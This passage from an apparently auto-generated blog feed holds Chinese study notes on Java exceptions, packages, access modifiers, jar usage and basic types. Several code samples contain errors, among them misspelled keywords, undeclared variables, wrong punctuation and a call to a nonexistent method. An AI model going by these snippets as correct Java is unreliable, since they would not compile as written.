class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">Throwable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IOException(); <span class="comment">//throw 抛出异常</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> <span class="keyword">throws</span> B</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> B();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="throws"><a href="#throws" class="headerlink" title="throws"></a>throws</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void f() throws A</span><br><span class="line">&#123;</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    thows A表示调用f方法时f方法可能会抛出A类异常，建议您调用f方法时最好对f方法可能抛出的A类异常进行捕捉</p><ul><li><p><strong>throws A不表示f方法一定会抛出A类异常</strong></p><p>throws A,f方法也可以不抛出A类异常</p></li><li><p><strong>throws A不表示调用f方法时,必须的对A异常进行捕捉</strong></p><ul><li>假设A是RuntimeException子类异常<pre><code>由于RuntimeException的子类异常可以处理也可以不处理，所以编译器允许你调用f方</code></pre>法时，对f方法抛出的RuntimeException子类异常不进行处理</li></ul></li><li><p><strong>强烈建议你</strong></p><ul><li><strong>对throws出的所有异常进行处理</strong></li><li><strong>如果一个方法内部己经对A异常进行了处理,则就不要再throws A</strong></li></ul></li></ul><p>例如</p><p><img src><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/thrwos1.png" alt="thrwos1"></p><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/throws2.png"></p><p>​    <strong>自己设计f方法，内部写有throw，函数名就要写throws。如果不是设计f方法，而是调用f方法，看到写了throws不管是否要捕获，都要自己进行捕获</strong></p><p>​    <strong>自己定义的异常要继承Exception</strong></p><h1 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h1><p>异常抛出的是一个对象</p><p>抛出代码要怎么写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">throw new DivisorIsZeroExceptior();</span><br></pre></td></tr></table></figure><p>Throwa 只能抛出类，表示一个声明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divide</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="keyword">throws</span> DivisorIsZeroException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>==b)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> DivisorIsZeroException(<span class="string">&quot;除数不能为零!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (DivisorIsZeroException e)</span><br><span class="line">        &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>==b)</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> DivisorIsZeroException(<span class="string">&quot;除数不能为零!&quot;</span>):</span><br><span class="line"><span class="keyword">int</span> m=a/b;</span><br><span class="line"><span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="小剧场"><a href="#小剧场" class="headerlink" title="小剧场"></a>小剧场</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void f() throws A</span><br><span class="line">&#123;</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br><span class="line">void g()</span><br><span class="line">&#123;</span><br><span class="line">f();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>throws A可以不抛异常，g可以直接调用不需要捕获A异常</p><ol><li><p>Throws A不表示f一定抛出A</p></li><li><p>Throws A不表示g调用f时一定要捕获A</p><p>​    要看A是什么异常，如果A是可处理可不处理的异常，g就不需要捕获，如果是必须处理g调用f()时，要写try</p></li></ol><p>3.果A是必须处理的异常，内部不一定要捕获</p><h1 id="注意问题"><a href="#注意问题" class="headerlink" title="注意问题"></a>注意问题</h1><ul><li>所有的catch只能有一个被执行</li><li>有可能所有的catch都没有执行</li><li><strong>先catch子类异常再catch父类异常</strong><br>■如果先catch父类异常再catch子类异常，则编译时会报错</li><li>catch与catch之间是不能有其他代码的</li><li><strong>重写方法抛出异常的范围不能大于被重写方法排除的异常范围</strong></li></ul><h2 id="异常的范围"><a href="#异常的范围" class="headerlink" title="异常的范围"></a>异常的范围</h2><p>​    A,B,C 三个异常A是父类，B继承A，C继承B，A,B,C三个异常都可以被A捕获，因为A是父类，所以<strong>先catch子类异常再catch父类异常</strong></p><h1 id="异常的优点"><a href="#异常的优点" class="headerlink" title="异常的优点"></a>异常的优点</h1><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/%E6%B2%A1%E6%9C%89%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E7%A8%8B%E5%BA%8F.png"></p><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/%E6%9C%89%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F.png"></p><p>以常规方法处理错误存在的问题<br>■ 观察前面的程序，大家会发现大部分精力花在出错处理上了<br>■ 只把能够想到的错误考虑到，对以外的情况无法处理<br>■ 程序可读性差，大量的错误处理代码混杂在程序中<br>■ 出错返回信息量太少，无法更确切的了解错误状况或原因</p><p><img src="/2021/04/12/Java-3%E5%BC%82%E5%B8%B8/%E6%9C%89%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F.png"></p><h2 id="异常的优缺点"><a href="#异常的优缺点" class="headerlink" title="异常的优缺点"></a>异常的优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>■ 强制程序员考虑程序的安全性与健壮性<br>■ 增强了程序员对程序的可控性<br>■ 有利于代码的调试<br>■ 把错误处理代码从常规代码中分离出来</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>■ 异常并不一定能够使程序的逻辑更清晰<br>    因为有时我们必须得编写代码捕捉异常，所以可能会导致程序的逻辑非常混乱<br>■ 异常并不能解决所有的问题</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;异常-try-…-catch&quot;&gt;&lt;a href=&quot;#异常-try-…-catch&quot; class=&quot;headerlink&quot; title=&quot;异常 try … catch&quot;&gt;&lt;/a&gt;异常 try … catch&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;异常（exception）不</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 2包</title>
    <link href="http://example.com/2021/04/09/Java-2%E5%8C%85/"/>
    <id>http://example.com/2021/04/09/Java-2%E5%8C%85/</id>
    <published>2021-04-09T03:01:17.000Z</published>
    <updated>2021-04-20T13:54:34.412Z</updated>
    
    <content type="html"><![CDATA[<h1 id="包声明-package"><a href="#包声明-package" class="headerlink" title="包声明 package"></a>包声明 package</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名“TestPackage.java&quot;</span></span><br><span class="line"><span class="keyword">package</span> zhangsan.lisi; <span class="comment">//1行</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPackage</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> statit <span class="keyword">void</span> <span class="title">main</span><span class="params">(String0 args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">new</span> A().print(); </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;AAAAA&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>package语句必须得是第一条语句</li><li>package zhangsan.lisi表示:<br> 把该文件中所有的类放入zhangsan.lisi这个包中（把编译的东西放进zhangsan文件夹下的lisi的文件夹下），并且该文件中所有的<strong>类真正名字将是包名和类名的组合</strong></li><li>如:类TestPackage 的名字将变成zhangsan.isl.TestPackage，而不再是TestPackage</li><li>编译时建议使用 javac-d . TestPackage.java 尽量不要使用 javac TestPackage.java 因为后者要自己手动建立包目录</li><li>如果不在当前路径下运行程序，则必须保证class文件的最上层目录的父目录位于classpath下</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> zhangsan.lisi;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;AAAA\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">M</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">new</span> A().f();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用javac 需要手动建立包成</p><p><strong>真正的类名是 包层+类名</strong></p><p>建议使用命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d 启动类名.java</span><br></pre></td></tr></table></figure><h4 id="java-zhangsan-lisi-TestPackage解析"><a href="#java-zhangsan-lisi-TestPackage解析" class="headerlink" title="java zhangsan.lisi.TestPackage解析"></a>java zhangsan.lisi.TestPackage解析</h4><p>​    先检测当前目录下是否有zhangsan/isi这个包(包即文件夹)，如果有,再检测该包下是否有zhangsan.lisiTestPackage 这个类，如果没有，编译器将再去classpath设置的路径中依次查找。如果都查找失败，则运行时出错</p><p>​    设置变量设置到包层里是错误的，程序找不到包层，设置环境变量要设置最上层</p><h1 id="同包-和-不同包-类的相互访问"><a href="#同包-和-不同包-类的相互访问" class="headerlink" title="同包 和 不同包 类的相互访问"></a>同包 和 不同包 类的相互访问</h1><ul><li>包相当于一个文件夹</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//A.java文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     System.out.println (<span class="string">&quot;AAAA&quot;</span>);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//B.java文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     aa = <span class="keyword">new</span> A();</span><br><span class="line">        aa.f();   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Javac A.java B.java</span><br><span class="line">java B</span><br><span class="line">----------------------------------</span><br><span class="line">输出结果</span><br><span class="line">AAAA</span><br></pre></td></tr></table></figure><p>附注：</p><p>​    因为类A和类B默认是在同一个无名的包中所以彼此可以相互访问，只要是非私有成员都可以被同包的另二个类访问</p><h1 id="不同包类的相互访问"><a href="#不同包类的相互访问" class="headerlink" title="不同包类的相互访问"></a>不同包类的相互访问</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名 A.java</span></span><br><span class="line"><span class="keyword">package</span> zhangsan.lisi;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ma</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;AAAAA&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件名 B.java</span></span><br><span class="line"><span class="keyword">package</span> com.ruide;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">zhangsan.lisi.A aa= <span class="keyword">new</span> zhangsan.lisi.A();</span><br><span class="line">        aa.ma();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单独编译时必须的先编译A.java,后编译B.jva，否则会出错建议两个文件一起编译</p><p>命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac -d . A.java B.java</span><br><span class="line">或</span><br><span class="line">javac -d . B.java A.java</span><br></pre></td></tr></table></figure><p><strong>只有公有类才能被另一个包访问</strong></p><h2 id="不同访问修饰符"><a href="#不同访问修饰符" class="headerlink" title="不同访问修饰符"></a>不同访问修饰符</h2><ul><li>在同一个包中只有私有的不能被另一个类访问，也只有私有的不能被继承</li><li>在不同包没有任何关系的两个类，只有public类的public成员才可以被另一个类访问</li><li>在不同包中有继承关系的两个类，只有public类的public成员和public类的protected成员可以被另一个包中的子类在内部使用，但是在子类的外部，通过子类对象名只能访问父类的public成员</li></ul><h1 id="使用不同包类的方式"><a href="#使用不同包类的方式" class="headerlink" title="使用不同包类的方式"></a>使用不同包类的方式</h1><p><strong>第一种：使用一个类的全名</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ruide;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">zhangsan.lisi.A aa = <span class="keyword">new</span> zhangsan.lisi.A();</span><br><span class="line">        aa.ma();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第二种：使用import语句导入一个包中所有的类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ruide;</span><br><span class="line"><span class="keyword">import</span> zhangsan.lisi.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span> A();</span><br><span class="line">        aa.ma();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第三种：使用import语句导入一个包中特定的类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ruide;</span><br><span class="line"><span class="keyword">import</span> zhangsan.lisi.A;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">A aa = <span class="keyword">new</span> A();aa.ma();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:导入父包的类并不会自动导入子包的类</strong><br>    如: import zhangsan.*****；只会导入zhangsan这个包下的所有类，并不会导入zhangsan子包lisi这个包中的类<br>    考虑: import java.awt.*****；和 import java.awt.event.*；的区别</p><h3 id="不同包之间的相互方问"><a href="#不同包之间的相互方问" class="headerlink" title="不同包之间的相互方问"></a>不同包之间的相互方问</h3><p>不是内部类，不能添加修饰符，要加就加公有，要不什么都不加</p><p>两个不同的包，只能访问包的公有类，调用的只能是类的公有方法</p><p>不同包继承父类也是只能访问公有的</p><h1 id="jar包的生成-avi"><a href="#jar包的生成-avi" class="headerlink" title="jar包的生成 .avi"></a>jar包的生成 .avi</h1><h2 id="归档工具jar"><a href="#归档工具jar" class="headerlink" title="归档工具jar"></a>归档工具jar</h2><p>​    Java归档工具是JDK中提供的一种多用途的存档及压缩工具，可以将多个文件或目录合并压缩为单个的Java归档文件</p><p><strong>jar文件的主要作用：</strong><br>    发布和使用类库<br>    便于资源的组合和管理</p><p>例如：进入文件夹，把当前文件夹打一个架包，T是名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\桌面\java\&gt;jar cvf T.jar *</span><br></pre></td></tr></table></figure><p>架包不能双击打开，除非有菜单页面，可以用压缩包软件打开</p><h2 id="Jar使用举例"><a href="#Jar使用举例" class="headerlink" title="Jar使用举例"></a>Jar使用举例</h2><p>格式</p><ul><li><code>jar -cvf 要生成的包名.jar *</code></li></ul><p>举例</p><ul><li><p><code>jar -cvf c.jar *</code>  <strong>一般使用第一个</strong></p><p>功能：把当前路径下所有的文件即文件夹下所有的内容打包成c.jar</p></li><li><p><code>jar -tf c.jar</code></p><p>功能：在DOS下显示c.jar这个包解压后的文件的内容</p></li><li><p><code>jar -xf d:\1\c.jar</code></p><p>功能：把d:\1\c.jar这个文件中的内容解压到当前目录下</p></li></ul><h2 id="如何使用jar包中的类"><a href="#如何使用jar包中的类" class="headerlink" title="如何使用jar包中的类"></a>如何使用jar包中的类</h2><ul><li>假设现在有一个T.jar包，要想在任何目录下都可以访问T.jar包中的类，则设置classpath时，必须把包名T.jar也设置进去，因为T.jar也相当于一个目录</li><li>如在d:\share\java下有一个T.jar，则classpath必须设置为d:\share\java\T.jar，不能设置为d:\share\java，也不能设置成d:\share\java\T，否则在非当前目录下是无法访问T.jar包中的类的</li><li>Jar包也是一个目录</li></ul><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> baichi.shabi;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//可以把protected改为public,但却不能改为private,也不能在void前面什么都不写</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">System.out.printf(<span class="string">&quot;AAAAin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        aa = <span class="keyword">new</span> A();</span><br><span class="line">aa.f();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> zhangsan.lisi;</span><br><span class="line"><span class="keyword">import</span> baichi.shabi.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>; <span class="comment">//OK</span></span><br><span class="line">System.out.printf(<span class="string">&quot;GGGGin&quot;</span>);)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">B bb = <span class="keyword">new</span> B();</span><br><span class="line">        bb.g(); <span class="comment">//OK</span></span><br><span class="line"><span class="comment">//bb.f(); //error</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本程序证明了:<br>    在不同包中有继承关系的两个类，只有public类的public成员和public类的protected成员可以被另一个包中的子类在内部使用，但是在子类的外部，通过子类对象名只能访问父类的public成员</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;包声明-package&quot;&gt;&lt;a href=&quot;#包声明-package&quot; class=&quot;headerlink&quot; title=&quot;包声明 package&quot;&gt;&lt;/a&gt;包声明 package&lt;/h1&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 1基础</title>
    <link href="http://example.com/2021/04/09/Java-1%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/04/09/Java-1%E5%9F%BA%E7%A1%80/</id>
    <published>2021-04-09T02:24:20.000Z</published>
    <updated>2021-04-20T13:53:48.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>​        数值类型：</p><p>​                整数类型(byte, short,int,long)    </p><p>​                浮点类型（float,double)</p><p>​        字符型（char）</p><p>​        布尔型(boolean)</p><h3 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h3><p>​    类(class)    接口（interface)    数组</p><h1 id="输出数据的格式控制"><a href="#输出数据的格式控制" class="headerlink" title="输出数据的格式控制"></a>输出数据的格式控制</h1><table><thead><tr><th align="center">输出控制符</th><th align="center">针对的数据类型</th></tr></thead><tbody><tr><td align="center">%d</td><td align="center">int, long int , short, byte</td></tr><tr><td align="center">%x，%#x，%X，%#X</td><td align="center">int, long int</td></tr><tr><td align="center">%c</td><td align="center">char</td></tr><tr><td align="center">%f</td><td align="center">float，double</td></tr><tr><td align="center">%s</td><td align="center">String</td></tr></tbody></table><p><strong>注意：</strong></p><p>​    在java中没有%ld和%If,比如float和double都用%f输出，这是与C/C++不同的</p><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h4 id="1-整型常量"><a href="#1-整型常量" class="headerlink" title="1.整型常量"></a>1.整型常量</h4><p>十进制(12)，十六进制(0x12)，八进制（012)<br>    <strong>一个常量整数默认是int类型，如果数字过大，则必须的在末尾加L，否则会出错!</strong></p><p>例如：</p><pre><code> long i = 9223372036854775807; //error  编译报错,提示数字过大，</code></pre><p>​        但是如果改为:long i= 9223372036854775807L;   就可以了</p><h4 id="2-浮点常量"><a href="#2-浮点常量" class="headerlink" title="2.浮点常量"></a>2.浮点常量</h4><p>​    一个实数默认是double类型，如果希望一个<strong>实数是float类型，可以在数字后面加f(F)</strong><br>​        将一个double类型数值赋给float类型变量，编译是会报错例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 